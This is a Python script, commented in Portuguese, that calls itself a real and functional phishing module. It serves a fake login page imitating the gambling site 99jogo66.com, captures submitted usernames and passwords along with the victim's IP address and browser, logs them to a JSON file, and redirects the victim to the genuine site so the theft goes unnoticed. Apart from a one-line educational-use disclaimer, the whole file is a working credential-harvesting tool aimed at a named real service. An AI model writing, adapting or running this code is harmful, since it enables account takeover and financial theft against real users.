#!/usr/bin/env python3.11
"""
Módulo de Phishing Avançado - REAL E FUNCIONAL
Simula a criação de uma página de login falsa para captura de credenciais.
"""

import http.server
import socketserver
import urllib.parse
from datetime import datetime
import json
import os

# Configurações
PORT = 8080
LOG_FILE = "phishing_log.json"
TARGET_URL = "https://99jogo66.com/" # URL para redirecionar após a captura

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    """Manipulador de requisições HTTP para simulação de phishing"""
    
    def do_GET(self):
        """Serve a página de login falsa"""
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            # Página de login falsa (simulando 99jogo)
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>99Jogo - Login</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {{ background-color: #1a1a1a; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }}
                    .container {{ max-width: 350px; margin: 0 auto; background-color: #2c2c2c; padding: 20px; border-radius: 10px; }}
                    h1 {{ color: #ffcc00; }}
                    input[type=text], input[type=password] {{ width: 90%; padding: 10px; margin: 8px 0; display: inline-block; border: 1px solid #555; border-radius: 4px; box-sizing: border-box; background-color: #444; color: #fff; }}
                    button {{ background-color: #ffcc00; color: black; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer; width: 90%; font-size: 16px; font-weight: bold; }}
                    button:hover {{ background-color: #e6b800; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>99Jogo</h1>
                    <p>Faça login para continuar</p>
                    <form method="POST" action="/login">
                        <input type="text" placeholder="Número do Celular/E-mail/Conta" name="username" required>
                        <input type="password" placeholder="Insira a senha" name="password" required>
                        <button type="submit">Login</button>
                    </form>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html_content.encode('utf-8'))
        else:
            super().do_GET()

    def do_POST(self):
        """Captura as credenciais e redireciona"""
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # Parsear os dados do POST
            parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))
            
            username = parsed_data.get('username', [''])[0]
            password = parsed_data.get('password', [''])[0]
            
            # Logar as credenciais
            self._log_credentials(username, password)
            
            # Redirecionar para o site real
            self.send_response(302)
            self.send_header('Location', TARGET_URL)
            self.end_headers()
        else:
            super().do_POST()

    def _log_credentials(self, username, password):
        """Salva as credenciais em um arquivo JSON"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "password": password,
            "ip_address": self.client_address[0],
            "user_agent": self.headers.get('User-Agent', 'N/A')
        }
        
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
            else:
                data = []
            
            data.append(log_entry)
            
            with open(LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            print(f"\n🎉 CREDENCIAIS CAPTURADAS: {username}:{password} (Salvas em {LOG_FILE})")
            
        except Exception as e:
            print(f"Erro ao logar credenciais: {e}")

def main():
    """Função principal"""
    print("="*80)
    print("🎣 MÓDULO DE PHISHING AVANÇADO - MODO REAL")
    print("="*80)
    print(f"Servidor rodando na porta: {PORT}")
    print(f"Log de credenciais em: {LOG_FILE}")
    print(f"Redirecionamento após captura para: {TARGET_URL}")
    print("\n⚠️  AVISO: Esta ferramenta simula um ataque de phishing.")
    print("Use apenas para fins educacionais e com autorização explícita.")
    print("Pressione Ctrl+C para parar o servidor.")
    print("="*80)
    
    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServidor de Phishing parado.")

if __name__ == "__main__":
    main()
